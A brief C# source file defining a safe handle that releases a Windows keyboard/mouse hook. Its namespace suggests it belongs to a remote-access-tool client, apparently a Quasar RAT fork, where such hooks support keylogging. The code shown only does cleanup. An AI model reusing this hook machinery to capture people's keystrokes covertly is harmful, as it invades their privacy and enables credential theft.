using System.Windows.Forms;
using Microsoft.Win32.SafeHandles;

namespace xClient.KuuhakuÇekirdek.MouseKeyHook.WinApi
{
    internal class HookProcedureHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private static bool _closing;

        static HookProcedureHandle()
        {
            Application.ApplicationExit += (sender, e) => { _closing = true; };
        }

        public HookProcedureHandle()
            : base(true)
        {
        }

        protected override bool ReleaseHandle()
        {
            if (_closing) return true;
            return HookNativeMethods.UnhookWindowsHookEx(handle) != 0;
        }
    }
}